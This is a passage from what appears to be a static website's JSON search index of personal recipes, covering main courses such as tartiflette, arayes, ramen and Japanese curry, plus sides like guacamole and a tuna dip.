nutmeg</li> <li>sugar</li> <li>spaghetti</li> </ul> <p>Instructions:</p> <ol> <li>Melt butter on a large pan.</li> <li>Sautee diced ham, carrot and onions for 10 minutes.</li> <li>Add minced beef, crushed clove of garlic and cook for 10 minutes.</li> <li>Add wine, chicken stock.</li> <li>Steam while covered on low heat for 15 minutes.</li> <li>Add tomato paste and season</li> <li>Cover for another 20 minutes.</li> <li>Cook some spaghetti.</li> <li>Add some bolognese to spaghetti.</li> <li>(optional) Grate some parmesan on top.</li> </ol>"},{"location":"content/food/maincourses/#kert-burger","title":"Kert Burger","text":"<p>Ingredients</p> <ul> <li>1/8 mild kale</li> <li>1 tbsp mayonese</li> <li>1 tsp Tabasco classic</li> <li>1/4 yellow onion</li> <li>1 tsp BBQ sauce</li> <li>1 tsp mayonese</li> <li>1 tsp ketchup</li> <li>1 strip of bacon</li> <li>100g minced beef</li> <li>handful of Cheddar</li> <li>2 brioche buns</li> <li>1 slice of tomato or pickles</li> </ul> <p>Instructions:</p> <ol> <li>Dice onion and kale into small pieces, mix with tabasco and mayo.</li> <li>Mix BBQ sauce, mayo and ketchup.</li> <li>Roll the minced beef into a size that is just barely larger than the patty in diameter and make sure the middle of the patty is thinner than the sides.</li> <li>Heat a pan, add butter and brown the buns from both sides, set aside.</li> <li>Next season the bacon with salt, pepper and smoked paprika and cook until fat is rendered, then remove onto paper towels to absorb the fat and keep the bacon crispy.</li> <li>Add the patty with salt and pepper and cook 4-5 minutes from both sides, add some butter when flipping sides.</li> <li>On a smaller non stick pan, add cheddar.</li> <li>When the patty is ready and the cheddar is crispy from one side, put the patty on top of the cheddar and lift the patty with the cheddar to the side.</li> <li>Assembly is as follows: bottom bun, sauce, bacon, patty with cheese, more sauce, tomato or pickles, salad, top bun.</li> </ol>"},{"location":"content/food/maincourses/#tartiflette","title":"Tartiflette","text":"<p>Ingredients</p> <ul> <li>1kg potatoes</li> <li>3 fresh thyme sprigs</li> <li>115g thick-cut bacon, cut into 5mm lardons</li> <li>2 yellow onions</li> <li>120ml dry white wine</li> <li>120ml heavy cream or cr\u00e8me fra\u00eeche</li> <li>450g Reblochon</li> </ul> <p>Instructions:</p> <ol> <li>Peel and boil the potatoes with salt and thyme spigs (discard after boiled).</li> <li>Preheat oven to 165\u00b0C (Tammet\u00f5ru 185\u00b0C).</li> <li>Heat bacon over medium-high heat until fat begins to render.</li> <li>Lower heat to medium and stir occasionally, until fat is mostly rendered and bacon is cooked but not crisp, about 5 minutes.</li> <li>(optional) If there is not enough fat from the bacon, add about 20g of butter</li> <li>Add diced onions, season with salt and pepper, and cook until onions have softened but not browned, about 8 minutes.</li> <li>Add white wine and cook, stirring, until wine has almost fully cooked off, 1 to 2 minutes.</li> <li>Toss everything together in a bowl and move to a baking dish with cream or cr\u00e8me fra\u00eeche.</li> <li>Cover with slabs of Reblochon rind side up in a way that will melt the cheese evenly on top.</li> <li>Bake at 165\u00b0C (Tammet\u00f5ru 185\u00b0C) until golden brown, about 40 minutes.</li> </ol>"},{"location":"content/food/maincourses/#wasabi-mayo-beef-tacos","title":"Wasabi Mayo Beef Tacos","text":"<p>From Gordon Ramsay.</p> <p>Ingredients</p> <ul> <li>2 beef sirloin steaks</li> <li>6-8 small tortillas, to serve</li> <li>2 tablespoons light miso paste (aka soybean paste)</li> <li>2 tablespoons mirin (aka aji-mirin) or rice wine</li> <li>1/2 head of Chinese cabbage, finely shredded</li> <li>1 or 1 1/2 tablespoons rice vinegar or lemon juice</li> <li>1/2 teaspoon sesame oil</li> <li>1 teaspoon dried chile flakes</li> <li>1/2 teaspoon wasabi (depending on wasabi at hand), to taste</li> <li>2 heaping tablespoons mayonnaise</li> </ul> <p>Instructions:</p> <ol> <li>Set the pan on high with some olive oil.</li> <li>Season the steaks with salt and pepper, lay away from you on to the pan, and sear while giving the occasional shake to avoid sticking, 2-3 minutes on each side for rare/medium-rare, or until cooked to your liking. Render the fat by tipping the steaks onto their sides and cooking until the fat is golden and crisp, keep basting the steaks as you cook.</li> <li>While searing, mix the miso paste, mirin or rice wine, sugar, and olive oil, stirring well to dissolve the sugar. Season with salt and pepper and add a tablespoon of water if the mixture needs loosening a little.</li> <li>Slice the fat off and slip the steaks into the marinade.</li> <li>Meanwhile, prepare the quick pickled cabbage. Put the Chinese cabbage in a bowl and season with salt and pepper. Add the rice vinegar, sesame oil, and chile flakes. Toss the mixture to coat, then leave to soften slightly for a couple of minutes.</li> <li>Meanwhile, mix together the wasabi and mayonnaise, taste, and add a little more wasabi if you like a stronger flavor.</li> <li>Heat the tortillas for 30-60 seconds over a naked gas flame until charred and lightly toasted. Roll them around a rolling pin while they're still hot, and hold until cooled to set in half-moon taco shapes.</li> <li>Drain the beef of any excess marinade, then slice and place in the tacos. Top with the cabbage and a little wasabi mayo.</li> </ol>"},{"location":"content/food/maincourses/#french-tacos","title":"French Tacos","text":"<p>The Unlikely Rise of the French Tacos, recipe from You Suck At Cooking.</p> <p>Ingredients</p> <ul> <li>1 onion</li> <li>2 garlic cloves</li> <li>450g ground beef</li> <li>Some fries</li> <li>Cream</li> <li>Gruyere cheese</li> <li>Other french cheese of choice</li> <li>Pickled jalapenos</li> <li>Tortilla wraps</li> </ul> <p>Instructions:</p> <ol> <li>Slice half of the onion and dice the other half.</li> <li>Put the 1/2 sliced onion in a pan with some oil on medium heat and cook until brown, set aside.</li> <li>Put the 1/2 diced onion with crushed and diced garlic in the pan with some oil on medium heat and cook until softened.</li> <li>Add the ground beef to pan, season with salt and pepper and cook until brown.</li> <li>Prepare the fries, either in oven or your choice of a fryer.</li> <li>In a skillet, add cream and warm until it starts to steam a little.</li> <li>Add the cheese and stir until melted.</li> <li>Add butter to taste and some flour if needed to thick the sauce.</li> <li>Combine everything in a tortilla wrap, add some more cheese and wrap it up.</li> <li>Warm the wrap on a pan on medium heat or on a sandwich grill until the cheese melts.</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/maincourses/#arayes","title":"Arayes","text":"<p>From You're Probably Sleeping on Arayes by Internet Shaquille.</p> <p>Ingredients</p> <ul> <li>1 medium onion</li> <li>1 bunch of parsley</li> <li>2 garlic cloves</li> <li>450g ground beef (lower fat content is better)</li> <li>Kofta/kaftah spice mix</li> <li>pita (tortillas work less well)</li> </ul> <p>Alternative to Kofta/kaftah Spice Mix Ingredients</p> <ul> <li>1/2 tsp cumin</li> <li>1/2 tsp coriander</li> <li>1 tsp paprika</li> <li>1 tsp black pepper</li> <li>1 tbsp seven spice / baharat mix</li> </ul> <p>Alternative to Seven Spice / Baharat Mix Ingredients</p> <ul> <li>2 tbsp allspice</li> <li>1 1/2 tbsp cumin</li> <li>1 tbsp coriander</li> <li>2 tsp cloves</li> <li>2 tsp nutmeg</li> <li>1 1/2 tsp cinnamon</li> <li>1 tsp black pepper</li> </ul> <p>Notes:</p> <ul> <li>It's essentially kofta, but in between a carb, like a pita or a tortilla, giving the change to mix it up a bit.</li> <li>The spice mix is the base of this dish, so it's important to get it right.</li> <li>Moisture is a problem for this dish, but it wants to be crispy, grilled rather than juicy or, god forbid, soggy. How much you squeeze out of the onion-parsley, how much fat is in the beef and what kind of cooking method you use are all important.</li> <li>I think there is a fresh component missing. Experiment and see what you like. Classic tortilla recipes provide good inspiration with cheese, tomato, lettuce, etc, but they feel a little at odds with the nature of indian spices.</li> </ul> <p>Instructions:</p> <ol> <li>Cut onion into quarters and put into food processor with garlic.</li> <li>Remove stems from parsley and add to food processor.</li> <li>Process until homogenous and then take out and squeeze out excess moisture.</li> <li>Add ground beef and spice mix to food processor and process until homogenous (Add salt if your spice mix doesn't already have enough!).</li> <li>Even after squeezing out the moisture and using lower fat beef, the mixture will still be quite wet, but that's what you want.</li> <li>Cut pita in half and stuff the mixture in between the halves.</li> <li>Brush the outside of the pita with olive oil.</li> <li>Slap them in a charcoal grill, or on a cast iron pan on the stove on medium heat (coals white with grill), or 200C oven until crispy and browned.</li> </ol>"},{"location":"content/food/maincourses/#creamy-chiken-soup","title":"Creamy Chiken Soup","text":"<p>From: https://www.melskitchencafe.com/creamy-chicken-soup/</p> <p>Ingredients</p> <ul> <li>1 teaspoon olive oil</li> <li>about 3-4 medium carrots</li> <li>about 3 stalks celery</li> <li>1 small/medium onion</li> <li>1L chicken broth (either low sodium, or add less salt)</li> <li>2 cubes chicken bouillon or 1 tablespoon chicken bouillon paste</li> <li>3 bay leaves</li> <li>1 tablespoon dried parsley</li> <li>1 \u00bd teaspoons herbs de provence</li> <li>1 teaspoon turmeric</li> <li>\u00bd teaspoon garlic powder or 2-3 cloves garlic, finely minced</li> <li>\u00bd teaspoon coarsely ground black pepper</li> <li>0.75L milk or half-and-half or a combo</li> <li>about 400g chopped chiken</li> <li>Shredded parmesan, asiago or gruyere cheese, for topping (optional)</li> </ul> <p>Roux</p> <ul> <li>6 tablespoons all-purpose flour</li> <li>6 tablespoons butter</li> </ul> <p>Instructions:</p> <ol> <li>For the soup, in a 4-quart or larger saucepan, heat the olive oil over medium heat. Add the carrots, celery and onion. Pour in the broth and add the chicken bouillon, bay leaves, parsley, herbs de provence, turmeric, garlic powder, and pepper. Stir to combine.</li> <li>Bring the mixture to a simmer and cook, uncovered or partially covered, for 12-15 minutes until the vegetables are tender.</li> <li>For the roux, while the soup simmers, in a small saucepan, add the olive oil and butter and cook on medium heat until the butter is melted. Add the flour and whisk to combine until a smooth paste forms. Remove from the heat.</li> <li>Add the milk (and/or half-and-half) to the soup and heat through. Add the roux to the soup and cook, stirring or whisking constantly, over medium heat until the soup thickens and gently simmers, 5-7 minutes.</li> <li>Stir in the chicken, season to taste with salt and pepper (this is important for flavor!) and heat through.</li> <li>Remove the bay leaves and serve with a sprinkle of Parmesan, asiago or gruyere on top.</li> </ol> <p>Notes:</p> <ul> <li>Half-and-half: the more half-and-half you use, the creamier this soup will be but milk works great, too. I suggest using at least 1% or 2% (not skim).</li> <li>Bouillon: the chicken bouillon (cube, paste or granules) intensifies the overall flavor of the soup. If you leave it out, season well to taste.</li> <li>Potatoes: potatoes make a great addition to this soup. I add peeled, diced potatoes (usually Yukon gold, but any variety would work) with the broth.</li> </ul>"},{"location":"content/food/maincourses/#caesar-salad","title":"Caesar Salad","text":"<p>Salad Ingredients</p> <ul> <li>Some chicken</li> <li>Roman salad</li> </ul> <p>Chicken Instructions:</p> <ol> <li>Cook some chicken to taste (keep more neutral, there will be enough taste in dressing), set aside.</li> </ol> <p>Caesar dressing ingredients</p> <ul> <li>150ml mayonnaise</li> <li>1 medium garlic clove, minced</li> <li>2 teaspoons lemon juice, to taste</li> <li>1 teaspoon Dijon mustard</li> <li>\u00bd teaspoon Worcestershire sauce*, to taste</li> <li>\u215b teaspoon fine salt</li> <li>Some Parmesan cheese</li> <li>1 tablespoon water</li> <li>Freshly ground black pepper, to taste</li> </ul> <p>Dressing Instructions:</p> <ol> <li>Combine everything and mix well</li> </ol> <p>Croutons ingredients</p> <ul> <li>Stale baguette, sourdough, ciabatta or equivalent</li> <li>Butter</li> <li>Neutral cheddar cheese</li> </ul> <p>Crouton Instructions:</p> <ol> <li>Cut bread into cubes</li> <li>Melt butter on pan</li> <li>Mix butter and bread, season to taste</li> <li>Keep adding butter if the pan is dry until bread is nice and brown</li> <li>In the end add cheese and keep mixing until the cheese is no longer dripping</li> </ol> <p>Salad Instructions:</p> <ol> <li>In a bowl mix roman salad, chicken, and some dressing</li> <li>Add croutons and grated cheese and mix some more</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/maincourses/#low-effort-miso-ramen","title":"Low-Effort Miso Ramen","text":"<p>Partly inspired by 7 Ingredient Restaurant Style Ramen by Pro Home Cooks.</p> <p>IMPORTANT! With ramen it is important to prepare noodles, broth and toppings separately, not letting the tastes blend together makes it more exciting and defined, less of soup in the end AND this way the toppings don't get soggy.</p> <p>Broth ingredients</p> <ul> <li>Miso paste</li> <li>Bullion (according to meat, chicken in this case)</li> <li>1cm cube of ginger</li> <li>1-2 cloves garlic</li> </ul> <p>Broth instructions:</p> <ol> <li>Super finely dice or grate garlic and ginger into a pot at medium heat, let soften with some olive oil.</li> <li>Add 2 tbsp of miso paste and caramelize for 2 minutes.</li> <li>Add a handful of bullion at a time into the pot while sirring to emulsify the mixture.</li> </ol> <p>Noodles ingredients</p> <ul> <li>Ramen or egg noodles</li> </ul> <p>Noodle instructions: Cook according to packaging, but leave a little stiffer than you normally would (according to taste, if you like your noodles in ramen to be stronger) as they will absorb some broth too anyway.</p> <p>Toppings ingredients</p> <ul> <li>Mushrooms (shiitake or other according to taste)</li> <li>Bean sprouts</li> <li>Bok Choy</li> <li>Green onion</li> <li>Meat according to taste, chicken in this case</li> <li>Meat seasoning (salt, pepper, garlic powder, ground ginger, and chili powder)</li> <li>Half boiled eggs</li> </ul> <p>For toppings, feel free to leave or add things as you like.</p> <p>Topping instructions:</p> <ul> <li>For mushrooms: add to pan with some garlic and ginger, cook at medium heat for about 5 minutes.</li> <li>For chicken: mix chiken with salt, pepper, garlic powder, ground ginger, and chili powder, cook on medium heat 5-6 minutes, until they begin to brown, then flip and cook for another 5 minutes.</li> <li>For bok choy: add to boiling water for 1 minute (don't let it get soggy), best to do this right after boiling noodles.</li> <li>For green onion: slice into small rings.</li> <li>For eggs: boil for 6 minutes and plop into cold water.</li> </ul>"},{"location":"content/food/maincourses/#tacos-with-rajas-con-crema","title":"Tacos with Rajas Con Crema","text":"<p>Rajas Con Crema ingredients</p> <ul> <li>3 poblano peppers</li> <li>\u00bc white onion, sliced</li> <li>Dried oregano</li> <li>\u00bc cup heavy cream</li> <li>\u00bd lime, juiced</li> <li>Salt and pepper</li> </ul> <p>Rajas Con Crema instructions:</p> <ol> <li>Remove the tops and seeds from 3 poblano peppers and cut in half. Place peppers on an open flame until they turn black on the outside. Once they\u2019re black put them in foil 10 minutes to let them rest and soften up.</li> <li>Remove from foil and remove all the charred outside skin and slice them into strips or into bite sized pieces.</li> <li>In a skillet add \u00bd white onion sliced with some olive oil and saute for about 1-2 minutes before adding your poblano peppers and some dried oregano. Let cook for a few minutes.</li> <li>Next add \u00bc cup of heavy cream and the juice of \u2153 a lime and cook for about 5 minutes or until thickened. Salt and pepper to taste.</li> <li>Remove from skillet and place in a bowl. Set aside.</li> </ol> <p>Chicken ingredients</p> <ul> <li>2 chicken breasts</li> <li>2 cloves garlic, roughly chopped</li> <li>2 limes, juiced</li> <li>Shakes of: white pepper, cumin, smoked paprika, oregano, cayenne pepper</li> <li>Olive oil</li> <li>Salt and pepper</li> <li>Sugar</li> </ul> <p>Chicken instructions:</p> <ol> <li>Start by butterflying the chicken and placing it in a plastic bag.</li> <li>In a bowl combine 2 cloves of roughly chopped garlic, the juice of 2 limes, a good shake each of white pepper, cumin, smoked paprika, oregano, cayenne pepper, a few glugs of olive oil and some salt and pepper. Also you want to add a little bit of sugar because that will help with the browning later on. Whisk everything together and then put it in the bag with the chicken.</li> <li>Remove air from the bag and massage to combine everything. Place in bowl, and put the bowl in the fridge for 1-4 hours.</li> <li>Remove chicken from marinade and place on a ripping hot skillet. Cook until each side has browning and internal temperature reaches 165\u00b0F. Once fully cooked, cover with foil and set aside to rest.</li> <li>Slice into bite sized slices.</li> </ol> <p>Garnish ingredients</p> <ul> <li>Some white onion, diced</li> <li>Cilantro or parsley to taste</li> <li>Feta</li> </ul> <p>Taco instructions: Assemble with tortilla, rajas con crema and some cotija or feta cheese, optionally some diced white onion.</p>"},{"location":"content/food/maincourses/#summer-chickpea-salad","title":"Summer chickpea salad","text":"<p>From Jamie Oliver's summer chickpea salad.</p> <p>Ingredients</p> <ul> <li>1 small red onion, peeled</li> <li>1\u20132 fresh red chillies, deseeded</li> <li>2 handfuls of ripe red or yellow tomatoes</li> <li>1 lemon</li> <li>extra virgin olive oil</li> <li>sea salt and freshly ground black pepper</li> <li>1 x 410g jar or tin of chickpeas, drained, or around 4 large handfuls of soaked and cooked chickpeas</li> <li>a handful of fresh mint, chopped</li> <li>a handful of fresh green or purple basil, finely ripped</li> <li>100g feta cheese</li> </ul> <p>Instructions:</p> <ol> <li>Finely slice your red onion.</li> <li>Finely slice your chillies then roughly chop your tomatoes, mixing them in with the onion and chillies.</li> <li>Scrape all of this, and the juice, into a bowl and dress with the juice of half a lemon and 3 tablespoons of good extra virgin olive oil. Season to taste.</li> <li>Heat the chickpeas in a pan, then add 90 per cent of them to the bowl.</li> <li>Mush up the remaining chickpeas and add these as well \u2013 they will give a nice creamy consistency. Allow to marinate for a little while and serve at room temperature.</li> <li>Just as you're ready to serve, give the salad a final dress with the fresh mint and basil. Taste one last time for seasoning \u2013 you may want to add the juice from your remaining lemon half at this point.</li> <li>Place on a nice serving dish and crumble over the feta cheese.</li> </ol>"},{"location":"content/food/maincourses/#potato-dough-stuffed-patties","title":"Potato Dough Stuffed Patties","text":"<p>Ingredients</p> <ul> <li>6 large potatoes, cubed</li> <li>1 onion, diced</li> <li>1 garlic clove, crushed</li> <li>500g ground beef</li> <li>50g unsalted butter</li> <li>1 egg</li> <li>160g wheat flour</li> <li>Some cheese</li> <li>Oil for frying</li> </ul> <p>Instructions:</p> <ol> <li>Boil the cubed potatoes with 1 teaspoon of salt in 1L of water for 20 minutes.</li> <li>While the potatoes are boiling, saute the diced onion and crushed garlic in a pan. Add the ground beef, 1 teaspoon of salt, and black pepper to taste. Cook until the beef is browned.</li> <li>Drain the potatoes and transfer them to a bowl. Add the unsalted butter, egg, and wheat flour. Mix until well combined.</li> <li>Flour your working area and take a portion of the dough to form a fat pancake. Place some of the meat mixture and cheese in the center, then fold the dough over to form a flattened ball.</li> <li>Heat oil in a pan and fry each ball until golden brown on all sides.</li> </ol>"},{"location":"content/food/maincourses/#hoisin-chicken-lettuce-cups","title":"Hoisin chicken lettuce cups","text":"<p>Ingredients</p> <ul> <li>Mango puree</li> <li>Hoisin sauce</li> <li>Soy sauce</li> <li>2 chicken breasts</li> <li>1 romaine lettuce</li> <li>1 punnet of cress</li> </ul> <ol> <li>Flatten chicken, season with olive oil, salt, pepper, and cayenne. Leave to marinate.</li> <li>In bowl combine mango, hoisin and just a little soy into a sauce. Ratios to taste, I prefer something like 1:2 mango:hoisin, then a dash or two of soy.</li> <li>Grill chicken and cut into strips.</li> <li>Add everything to a leaf of romaine, and be generous with the sauce (otherwise the lettuce might be a little overpowering)!</li> </ol> <p>Notes:</p> <ul> <li>Alternatively, instead of putting the sauce in the cup: serve sauce in something where the cups can be dipped into!</li> </ul>"},{"location":"content/food/maincourses/#beef-quesadillas-with-salsa","title":"Beef Quesadillas with Salsa","text":"<p>From: Gordon Ramsay's Mexican Beef and Jalape\u00f1o Quesadillas</p> <p>Ingredients</p> <ul> <li>2 tbsp olive oil, plus extra for brushing</li> <li>1 onion, peeled and diced</li> <li>2 garlic cloves, peeled and crushed</li> <li>500g minced beef</li> <li>2 tsp paprika</li> <li>2 tsp ground cumin</li> <li>1 x 400g tin of chopped tomatoes</li> <li>1 x 400g tin of kidney beans, drained and rinsed</li> <li>200g mixture of grated mozzarella and Cheddar cheese</li> <li>4 spring onions, trimmed and sliced</li> <li>80g pickled jalape\u00f1o chillies</li> <li>4 x 25cm tortillas</li> <li>Sea salt and freshly ground black pepper</li> <li>Sour cream, to serve</li> </ul> <p>Salsa Ingredients</p> <ul> <li>4 tomatoes, diced</li> <li>1 red onion, peeled and finely diced</li> <li>Large handful of coriander, roughly chopped</li> <li>Juice of 1 lime</li> </ul> <p>Instructions:</p> <ol> <li>Preheat the oven to 220\u00b0C/200\u00b0C and line two large baking trays with baking paper.</li> <li>Heat a large non-stick frying pan over high heat, add olive oil and onion, and cook for 2\u20133 minutes until softened. Add garlic and cook for 2 minutes.</li> <li>Crumble in the minced beef and cook over high heat for 4\u20135 minutes until lightly browned.</li> <li>Stir in paprika and cumin, cooking for 1\u20132 minutes. Add tinned tomatoes and cook for 2 minutes. Remove from heat, stir in kidney beans, and season to taste.</li> <li>Lightly brush one side of a tortilla with oil and place it oiled side down on a prepared tray. Sprinkle cheese over one half, spread a quarter of the beef mixture on top, and scatter spring onions, jalape\u00f1os, and more cheese. Fold over the tortilla. Repeat for the remaining tortillas.</li> <li>Brush the tops of the folded tortillas with oil. Press them down firmly and bake on the two highest shelves of the oven for 10\u201315 minutes, or until golden brown.</li> <li>While the quesadillas are baking, mix all salsa ingredients in a bowl and season to taste.</li> <li>Remove quesadillas from the oven, cut into wedges, and serve with sour cream and salsa on the side.</li> </ol>"},{"location":"content/food/maincourses/#japanese-chicken-curry","title":"Japanese Chicken Curry","text":"<p>From: JustOneCookBook's Chicken Curry</p> <p>Ingredients</p> <ul> <li>4 large onions (1,340 g)</li> <li>4 carrots (380 g)</li> <li>6 Yukon gold potatoes (864 g)</li> <li>2 tsp grated ginger</li> <li>4 garlic cloves, minced</li> <li>1 apple (340 g), grated</li> <li>1,360 g boneless, skinless chicken thighs</li> <li>Freshly ground black pepper</li> </ul> <p>Curry Sauce Ingredients</p> <ul> <li>3 Tbsp neutral oil</li> <li>1,920 ml chicken stock or water</li> <li>2 Tbsp honey</li> <li>2 Tbsp soy sauce</li> <li>2 Tbsp ketchup</li> <li>2 packages Japanese curry roux (400\u2013460 g)</li> </ul> <p>For Serving</p> <ul> <li>Cooked Japanese short-grain rice</li> </ul> <p>Instructions:</p> <ol> <li>Prepare Ingredients:</li> <li>Cut onions into thick wedges.</li> <li>Peel and cut carrots into rolling wedges.</li> <li>Peel and quarter potatoes, soaking them in water for 15 minutes.</li> <li>Grate ginger and apple, and mince garlic.</li> <li> <p>Trim excess fat from chicken thighs, cut into bite-sized pieces, and season with black pepper.</p> </li> <li> <p>Cook Curry:</p> </li> <li>Heat oil in a large pot over medium heat. Saut\u00e9 onions for 5 minutes until translucent.</li> <li>Add garlic and ginger, mixing well.</li> <li>Add chicken and cook until no longer pink on the outside.</li> <li>Pour in chicken stock, then add grated apple, honey, soy sauce, and ketchup.</li> <li> <p>Add carrots and potatoes. Simmer, covered, on medium-low heat for 15 minutes, stirring occasionally.</p> </li> <li> <p>Add Curry Roux:</p> </li> <li>Turn off heat. Dissolve curry roux cubes in a ladleful of cooking liquid, then stir into the pot. Repeat until all roux is incorporated.</li> <li> <p>Simmer uncovered on medium-low heat for 5\u201310 minutes, stirring frequently, until thickened.</p> </li> <li> <p>Serve:</p> </li> <li>Serve curry with steamed Japanese short-grain rice. Optionally garnish with Japanese pickled vegetables.</li> </ol> <p>Notes: - Substitute chicken with beef, pork, shrimp, tofu, or vegetables as desired. - Adjust salt to taste if using unsalted curry roux. - For russet potatoes, add them in the last 15\u201320 minutes of cooking to prevent disintegration.</p>"},{"location":"content/food/maincourses/#curry-doria","title":"Curry Doria","text":"<p>From: JustOneCookBook's Curry Doria</p> <p>Ingredients</p> <ul> <li>1 onion, minced</li> <li>2 ribs celery, minced</li> <li>2 carrots, minced</li> <li>4 cloves garlic, crushed or minced</li> <li>2 Tbsp extra virgin olive oil</li> <li>2 bay leaves</li> <li>340g ground beef</li> <li>340g ground pork</li> <li>Diamond Crystal kosher salt</li> <li>Freshly ground black pepper</li> <li>2 Tbsp Japanese curry powder</li> <li>720ml chicken or vegetable stock</li> <li>4 Tbsp tonkatsu sauce (or homemade equivalent)</li> <li>4 Tbsp ketchup</li> <li>4 Tbsp unsalted butter (divided)</li> <li>114g Mozzarella cheese (or Gruyere/Parmesan)</li> <li>114g Romano cheese (or Gruyere/Parmesan)</li> <li>4 Tbsp panko (Japanese breadcrumbs)</li> <li>Parsley, chopped (for garnish)</li> <li>Cooked Japanese short-grain rice (about 1.5 cups)</li> </ul> <p>Instructions:</p> <ol> <li>Prepare Ingredients:</li> <li>Mince onion, celery, and carrots into small pieces.</li> <li>Heat olive oil over medium heat. Add crushed garlic and bay leaves.</li> <li> <p>Saut\u00e9 onion and celery until almost translucent, then add carrots and cook until tender.</p> </li> <li> <p>Cook Meat Mixture:</p> </li> <li>Add ground beef and pork, breaking it up and cooking until no longer pink.</li> <li>Season with salt and pepper, then add curry powder and stock. Ensure the liquid covers the ingredients; add more if needed.</li> <li>Bring to a boil, skim off foam and fat, then reduce heat to medium-low and cook for 5 minutes.</li> <li> <p>Add tonkatsu sauce, ketchup, and 2 Tbsp butter. Cook until the sauce reduces and the bottom of the pan is visible, about 10 minutes.</p> </li> <li> <p>Assemble Doria:</p> </li> <li>Grease a baking dish with the remaining butter. Place steamed rice in the dish.</li> <li> <p>Add the meat mixture on top, followed by Mozzarella and Romano cheese. Sprinkle panko on top for a crispy texture.</p> </li> <li> <p>Broil:</p> </li> <li>Preheat oven to broil for 5 minutes. Broil for 2\u20133 minutes until the cheese melts and the top is golden brown. Alternatively, bake until golden brown.</li> <li>Garnish with chopped parsley and serve immediately.</li> </ol>"},{"location":"content/food/maincourses/#one-pan-chicken-and-shimeji-plate","title":"One-Pan Chicken and Shimeji Plate","text":"<p>Adapted from Today's Cooking Beginner's Recipe by Ryuta Kijima.</p> <p>Ingredients</p> <ul> <li>150g chicken thighs (for deep frying)</li> <li>1/2 pack (75g) shimeji mushrooms (large)</li> <li>1 egg</li> <li>1/8 head lettuce (about 50g)</li> <li>2 slices baguette (1cm thick)</li> <li>Your favorite dressing, as needed</li> <li>Grain mustard, as needed</li> <li>Oil</li> <li>Salt</li> <li>Coarsely ground black pepper</li> </ul> <p>Instructions:</p> <ol> <li>Add 1 tsp oil to a 20cm frying pan. Place chicken skin-side down, sprinkle with 2 pinches of salt, and set over medium heat from cold.</li> <li>Cut off the roots of the shimeji mushrooms. Crack the egg into a small bowl.</li> <li>When the chicken is browned, flip it and move to the side. Add shimeji mushrooms (breaking them up) to the pan. Pour the egg into the gap, cover, and steam over low-medium heat for 2\u20133 minutes.</li> <li>Sprinkle a pinch of salt over the mushrooms and egg. Turn the mushrooms over, turn off the heat, and sprinkle black pepper over everything.</li> <li>Insert torn lettuce and baguette slices into the pan. Add dressing to the lettuce if desired, and grain mustard to the chicken.</li> </ol> <p>Tips:</p> <ul> <li>Start heating the pan from cold for even cooking and to avoid rushing.</li> <li>A 20cm frying pan is ideal for a single serving and even cooking.</li> <li>Use a pan with a thick base and a heat-resistant glass lid for best results.</li> </ul>"},{"location":"content/food/maincourses/#one-pan-plate-of-pork-and-ginger","title":"One-Pan Plate of Pork and Ginger","text":"<p>Adapted from Today's Cooking Beginner's Recipe by Ryuta Kijima.</p> <p>Ingredients</p> <ul> <li>100g pork belly (thinly sliced)</li> <li>1 egg</li> <li>1/4 onion (50g)</li> <li>1/8 bunch mizuna (25g)</li> <li>2 tsp soy sauce</li> <li>1 tsp sugar</li> <li>1 tsp grated ginger</li> <li>Mayonnaise, as needed</li> <li>Sesame oil</li> </ul> <p>Instructions:</p> <ol> <li>Cut the onion into 5mm wedges. Cut mizuna into 5cm lengths. Cut pork into 6\u20137cm pieces. Beat the egg. In a small bowl, mix soy sauce, sugar, and grated ginger.</li> <li>Heat 1 tsp sesame oil in a 20cm frying pan over medium heat. Add pork and cook until the color starts to change. Add onion and continue frying until softened.</li> <li>Add the soy sauce mixture, stir to combine, and push everything to one side of the pan.</li> <li>Pour the beaten egg into the empty space, stir roughly, and cook to your preferred doneness.</li> <li>Turn off the heat, add mizuna, and garnish with mayonnaise.</li> </ol> <p>Tips:</p> <ul> <li>Stir eggs vigorously with chopsticks for fluffy scrambled eggs.</li> <li>A 20cm frying pan with a thick base and glass lid is ideal for single servings and even cooking.</li> </ul>"},{"location":"content/food/sides/","title":"Sides, Sauces & Spice Mixes","text":"<p>Collection of sauces, sides &amp; spice mix recipes.</p>"},{"location":"content/food/sides/#undercover-tuna-dip","title":"Undercover Tuna Dip","text":"<p>Sneak this next to the chips in a small bowl and watch as people unsuspectingly try and start loving it. Works best without telling people that it has tuna inside to avoid suspicions and hesitation, because the concept doesn't seem super appetizing, but will surely be devoured if anyone gets a taste.</p> <p>Ingredients</p> <ul> <li>1 can of tuna fillet in oil</li> <li>2-3 tsp Hellmann's (or other neutral) mayonnaise</li> <li>Juice of half of a lemon</li> </ul> <p>Instructions:</p> <ol> <li>Combine everything and season with salt to taste.</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/sides/#guacamole","title":"Guacamole","text":"<p>From Babish - Nachos</p> <p>Ingredients</p> <ul> <li>3 small ripe avocados</li> <li>1 clove fresh garlic</li> <li>1/2 small red onion, minced</li> <li>1 lime</li> <li>1 tsp toasted and freshly ground cumin</li> <li>Freshly ground pepper</li> <li>1/2 jalape\u00f1o, finely choped</li> <li>2 Tbsp cilantro, finely chopped</li> </ul> <p>Notes:</p> <ul> <li>Feeling funky? Add some banana, about 1/4 to 1/3 of a banana per 3 avocados depending on the size (Thanks, Ere!).</li> </ul> <p>Instructions:</p> <ol> <li>In a medium bowl, combine 3 small ripe avocados, 1 clove of crushed garlic, 1/2 of a small minced red onion, the juice from 1 lime, 1 teaspoon of toasted and freshly ground cumin, a pinch of kosher salt, a few twists of freshly ground pepper, 1/2 of a finely chopped jalape\u00f1o, and 2 finely chopped tablespoons of cilantro.  </li> <li>Using a fork, mash the combination together until it is relatively smooth. Scrape down the sides of the bowl and cover with plastic wrap, making sure to press it down directly onto the surface to prevent browning. Place in the refrigerator for later.</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/sides/#pico-de-gallo","title":"Pico de gallo","text":"<p>Ingredients</p> <ul> <li>453.59 g tomatoes, (3-4 medium), diced</li> <li>1/2 medium onion, (1 cup chopped)</li> <li>1 jalapeno pepper, seeded and finely minced (optional)</li> <li>8 g cilantro, chopped</li> <li>2 Tbsp lime juice, from 1 lime</li> </ul> <p>Mix everything and season to taste.</p>"},{"location":"content/food/sides/#miso-soup","title":"Miso soup","text":"<p>Ingredients</p> <ul> <li>1 tsp dashi granules</li> <li>1 tsp miso (white, red, or mixed)</li> 